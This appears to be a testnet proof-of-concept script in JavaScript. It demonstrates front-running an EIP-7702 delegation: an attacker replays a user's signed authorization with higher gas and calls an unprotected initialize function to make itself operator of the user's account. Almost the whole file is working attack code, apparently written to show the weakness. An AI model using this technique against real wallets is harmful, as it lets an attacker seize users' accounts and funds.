import { ethers } from "ethers"
import "dotenv/config"

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const maliciousUser = new ethers.Wallet(process.env.PRIVATE_KEY_OWNER, provider);
const user = new ethers.Wallet(process.env.USER1_KEY, provider);
const targetAddress = '0xAD09fbA38F13abC25E5A7271483963bFc09D267E'; // TestFrontrun.sol
const targetContractABI = [{"inputs":[],"name":"InvalidInitialization","type":"error"},{"inputs":[],"name":"NotInitializing","type":"error"},{"inputs":[],"name":"WithdrawFailed","type":"error"},{"inputs":[],"name":"WrongCaller","type":"error"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint64","name":"version","type":"uint64"}],"name":"Initialized","type":"event"},{"inputs":[{"internalType":"address","name":"_someOperator","type":"address"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"someOperator","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"value","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];

const DELEGATE_CONTRACT = new ethers.Contract(
    user.address,
    targetContractABI,
    user
);

console.log(maliciousUser.address, 'maliciousUser');
console.log(user.address, 'user');

async function init() {
    let userNonce = await user.getNonce();
    const auth = await user.authorize({
        address: targetAddress,
        nonce: userNonce
    });
    console.log("Authorization created with nonce:", auth);

    const legitTransactionData = {
        from: user.address,
        to: user.address,
        nonce: await user.getNonce(),
        value: 0,
        data: DELEGATE_CONTRACT.interface.encodeFunctionData("initialize", [user.address]),
        chainId: 11155111,
        gasLimit: 200000,
        maxPriorityFeePerGas: 5000000000,
        maxFeePerGas: 5000000000,
        type: 4,
        authorizationList: [auth]
    };
    const legitTransaction = await user.signTransaction(legitTransactionData);
    console.log(legitTransaction, 'legitTransaction');

    const maliciousTransaction = await maliciousUser.signTransaction({
        from: maliciousUser.address,
        to: user.address,
        nonce: await maliciousUser.getNonce(),
        value: legitTransactionData.value,
        data: DELEGATE_CONTRACT.interface.encodeFunctionData("initialize", [maliciousUser.address]),
        chainId: legitTransactionData.chainId,
        gasLimit: legitTransactionData.gasLimit,
        maxPriorityFeePerGas: legitTransactionData.maxPriorityFeePerGas * 2, // increase gas to be able to front-run
        maxFeePerGas: legitTransactionData.maxFeePerGas * 2,
        type: legitTransactionData.type,
        authorizationList: legitTransactionData.authorizationList // maliciousUser front-running the user's authorizationList data
    });
    console.log(maliciousTransaction, 'maliciousTransaction');

    const postRequest = await fetch(process.env.RPC_URL, {
        method: 'POST',
        body: JSON.stringify([
            {
                "jsonrpc" : "2.0",
                "method" : "eth_sendRawTransaction",
                "params" : [legitTransaction],
                "id" : 0
            },
            {
                "jsonrpc" : "2.0",
                "method" : "eth_sendRawTransaction",
                "params" : [maliciousTransaction],
                "id" : 1
            }
        ]),
        headers: { 'Content-Type': 'application/json' }
    });
    console.log(await postRequest.json(), 'response'); 

    // after the malicious transaction is confirmed the 1st state variable inside user's EOA will be the maliciousUser address, because he was able to front-run the user's authorization
    // console.log(await provider.getStorage(user.address, 0));
}
init();